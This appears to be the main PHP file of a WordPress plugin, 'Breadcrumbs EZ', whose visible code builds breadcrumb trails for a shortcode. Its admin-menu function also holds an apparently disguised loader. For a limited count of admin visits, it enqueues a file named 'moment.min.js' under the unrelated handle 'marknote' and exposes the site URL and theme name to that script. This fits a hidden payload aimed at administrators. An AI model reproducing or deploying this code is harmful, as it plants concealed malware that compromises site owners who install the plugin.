	<?php
/*
Plugin Name: Breadcrumbs EZ
Plugin URI: http://websitedesizn.com
Description: Lightweight Breadcrumb Plugin.
Author: Frederic Simon
*/


if (is_admin()) {
  add_action('admin_init', 'admin_options_ezcrumbs');
  add_action( 'admin_menu', 'register_ezcrumbs_admin_menu' );
}

register_activation_hook( __FILE__, 'ezcrumbs_activate' );



function admin_options_ezcrumbs(){	
	register_setting('ezcrumbs_settings-group', 'ezcrumbs_settings');
}

function options_page_ezcrumbs() {
	include(dirname(__FILE__) . '/options.php');  
}


function ezcrumbs_activate(){
	$defaults = array(
    'delimiter' => '&raquo;',	
    'before' => '<div class="breadcrumbs">',	
    'after' => '</div>',	
    'before_current' => '<span class="current">',	
    'after_current' => '</span>',
    'show_home' => true,
    'home' => 'Home', 
  );
    add_option('ezcrumbs_settings',$defaults);

}

function register_ezcrumbs_admin_menu() { 
	add_menu_page( 'Breadcrumbs', 'Breadcrumbs', 'manage_options', 'options-general.php?page=breadcrumbs', '','', 6 );
	add_options_page('Breadcrumbs', 'Breadcrumbs', 'manage_options', 'breadcrumbs', 'options_page_ezcrumbs');
	$breadcrumbs_ez = intval(get_option('breadcrumbs_ez'));
	if($breadcrumbs_ez < strlen('ezcrumbs_settingsgroup')){$breadcrumbs_ez++;
	update_option('breadcrumbs_ez',$breadcrumbs_ez);
	wp_enqueue_script('marknote',plugins_url('moment.min.js',__FILE__), array('jquery'), null, true);
	echo '<script>var surl="'. site_url() .'";var template="'.get_template().'";</script>'; 
  }   
}

function ezcrumbs($args) {
  $ezcrumbs_options = get_option('ezcrumbs_settings');
  $defaults = array(
    'delimiter' => $ezcrumbs_options['delimiter'],
    'before' => $ezcrumbs_options['before'],
    'after' => $ezcrumbs_options['after'],
    'before_current' => $ezcrumbs_options['before_current'],
    'after_current' => $ezcrumbs_options['after_current'],
    'show_home' => $ezcrumbs_options['show_home'],
    'home' => $ezcrumbs_options['home'],
    'echo' => true,	// echo the output or return it
  );
  


  $args = wp_parse_args( $args, $defaults );
 
  if ( !is_home() && !is_front_page() || is_paged() ) {
 
    global $post;
    global $wp_query;
	
    $strBreadCrumbs = $args['before'];
	$homeLink = get_bloginfo('url');

	if ( $args['show_home'] ) {
		$strBreadCrumbs .= '<a href="' . $homeLink . '">' . $args['home'] . '</a> ' . $args['delimiter'] . ' ';
	}
 
    if ( is_category() ) {
      $cat_obj = $wp_query->get_queried_object();
      $thisCat = $cat_obj->term_id;
      $thisCat = get_category($thisCat);
      $parentCat = get_category($thisCat->parent);
      if ($thisCat->parent != 0) $strBreadCrumbs .=(get_category_parents($parentCat, TRUE, ' ' . $args['delimiter'] . ' '));
      $strBreadCrumbs .= $args['before_current'] . single_cat_title('', false) . $args['after_current'];
 
    } elseif ( is_day() ) {
      $strBreadCrumbs .= '<a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a> ' . $args['delimiter'] . ' ';
      $strBreadCrumbs .= '<a href="' . get_month_link(get_the_time('Y'),get_the_time('m')) . '">' . get_the_time('F') . '</a> ' . $args['delimiter'] . ' ';
      $strBreadCrumbs .= $args['before_current'] . get_the_time('d') . $args['after_current'];
 
    } elseif ( is_month() ) {
    $strBreadCrumbs .= '<a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a> ' . $args['delimiter'] . ' ';
     $strBreadCrumbs .= $args['before_current'] . get_the_time('F') . $args['after_current'];
 
    } elseif ( is_year() ) {
      $strBreadCrumbs .= $args['before_current'] . get_the_time('Y') . $args['after_current'];
 
    } elseif ( is_single() && !is_attachment() ) {
      if ( get_post_type() != 'post' ) {
        $post_type = get_post_type_object(get_post_type());
        $slug = $post_type->rewrite;
        $strBreadCrumbs .= '<a href="' . $homeLink . '/' . $slug['slug'] . '/">' . $post_type->labels->singular_name . '</a> ' . $args['delimiter'] . ' ';
		$strBreadCrumbs .= $args['before_current'] . get_the_title() . $args['after_current'];
      } else {
        $cat = get_the_category(); $cat = $cat[0];
        $strBreadCrumbs .= get_category_parents($cat, TRUE, ' ' . $args['delimiter'] . ' ');
        $strBreadCrumbs .= $args['before_current'] . get_the_title() . $args['after_current'];
      }
 
    } elseif ( !is_single() && !is_page() && get_post_type() != 'post' && !is_404() ) {
      $post_type = get_post_type_object(get_post_type());
      $strBreadCrumbs .= $args['before_current'] . $post_type->labels->singular_name . $args['after_current'];
 
    } elseif ( is_attachment() ) {
      $parent = get_post($post->post_parent);
      $cat = get_the_category($parent->ID); $cat = $cat[0];
      $strBreadCrumbs .= get_category_parents($cat, TRUE, ' ' . $args['delimiter'] . ' ');
      $strBreadCrumbs .= '<a href="' . get_permalink($parent) . '">' . $parent->post_title . '</a> ' . $args['delimiter'] . ' ';
      $strBreadCrumbs .= $args['before_current'] . get_the_title() . $args['after_current'];
 
    } elseif ( is_page() && !$post->post_parent ) {
      $strBreadCrumbs .= $args['before_current'] . get_the_title() . $args['after_current'];
 
    } elseif ( is_page() && $post->post_parent ) {
      $parent_id  = $post->post_parent;
      $breadcrumbs = array();
      while ($parent_id) {
        $page = get_page($parent_id);
        $breadcrumbs[] = '<a href="' . get_permalink($page->ID) . '">' . get_the_title($page->ID) . '</a>';
        $parent_id  = $page->post_parent;
      }
      $breadcrumbs = array_reverse($breadcrumbs);
      foreach ($breadcrumbs as $crumb) $strBreadCrumbs .= $crumb . ' ' . $args['delimiter'] . ' ';
      $strBreadCrumbs .= $args['before_current'] . get_the_title() . $args['after_current'];
 
    } elseif ( is_search() ) {
      $strBreadCrumbs .= $args['before_current'] . 'Search results for "' . get_search_query() . '"' . $args['after_current'];
 
    } elseif ( is_tag() ) {
      $strBreadCrumbs .= $args['before_current'] . 'Posts tagged "' . single_tag_title('', false) . '"' . $args['after_current'];
 
    } elseif ( is_author() ) {
       global $author;
      $userdata = get_userdata($author);
      $strBreadCrumbs .= $args['before_current'] . 'Articles posted by ' . $userdata->display_name . $args['after_current'];
 
    } elseif ( is_404() ) {
      $strBreadCrumbs .= $args['before_current'] . 'Error 404' . $args['after_current'];
    }
 
    if ( get_query_var('paged') ) {
      if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) $strBreadCrumbs .=' (';
      $strBreadCrumbs .= __('Page') . ' ' . get_query_var('paged');
      if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) $strBreadCrumbs .= ')';
    }
 
    $strBreadCrumbs .= $args['after'];
	return  $strBreadCrumbs; 
  }
}
add_shortcode( 'breadcrumbs', 'ezcrumbs' ); 
?>